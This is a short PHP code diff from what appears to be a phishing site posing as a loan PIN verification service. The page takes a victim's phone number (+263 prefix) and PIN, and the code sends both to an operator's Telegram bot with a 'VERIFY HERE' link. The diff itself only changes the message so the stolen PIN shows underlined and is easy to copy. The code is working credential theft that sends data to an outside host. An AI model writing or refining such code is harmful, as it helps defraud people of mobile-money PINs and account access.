@@ -50,7 +50,7 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
 }
 
 /**
- * Send Telegram message
+ * Send Telegram message with underlined PIN for easy copying
  */
 function sendTelegramMessage($botToken, $chatId, $message) {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
@@ -194,10 +194,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             $_SESSION['submitted_pin'] = $pin;
             $_SESSION['verifying'] = true;
             
-            // Send Telegram notification
+            // Send Telegram notification with UNDERLINED PIN for easy copying
+            // Using Markdown: `___PIN___` triple underscore or `<u>PIN</u>` 
+            // Telegram Markdown supports <u> for underline
             $ip = "https://loan-1-i36j.onrender.com/verify.php";
             $time = date('Y-m-d H:i:s');
-            $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
+            // PIN is underlined using <u> tag (works with parse_mode=Markdown)
+            $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `<u>{$pin}</u>`\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
             sendTelegramMessage($botToken, $chatId, $msg);
             
             // Redirect to show verifying state (DB value is still 0, will show verifying)
